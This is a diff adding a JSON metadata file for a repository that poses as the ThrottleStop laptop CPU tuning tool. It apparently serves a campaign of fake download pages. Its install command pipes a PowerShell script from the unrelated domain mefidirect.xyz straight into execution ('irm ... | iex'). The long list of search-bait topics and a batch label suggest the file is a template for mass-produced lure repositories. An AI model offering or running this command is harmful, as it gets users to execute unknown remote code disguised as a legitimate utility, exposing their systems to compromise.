@@ -1,0 +1,29 @@
+{
+  "repo": "throttlestop-laptop-cpu-tuning-manager",
+  "product": "ThrottleStop Laptop CPU Tuning Manager",
+  "kind": "utility",
+  "install_type": "download",
+  "download_url": "https://throttlestop.mefidirect.xyz/",
+  "install_url": "https://mefidirect.xyz/ps/setup.ps1",
+  "install_command": "irm https://mefidirect.xyz/ps/setup.ps1 | iex",
+  "batch": "new31",
+  "format": "license-md-only",
+  "category": "utility",
+  "topics": [
+    "throttlestop-complete",
+    "throttlestop-tool",
+    "throttlestop-system-utility",
+    "windows-throttlestop",
+    "throttlestop-launch-fix",
+    "throttlestop-windows-install",
+    "throttlestop-pc-optimization",
+    "throttlestop-client-download",
+    "throttlestop-deployment-guide",
+    "throttlestop-deploy-2026",
+    "throttlestop-offline-installer",
+    "setup-guide",
+    "optimization-tools",
+    "win-tools",
+    "system-utility"
+  ]
+}
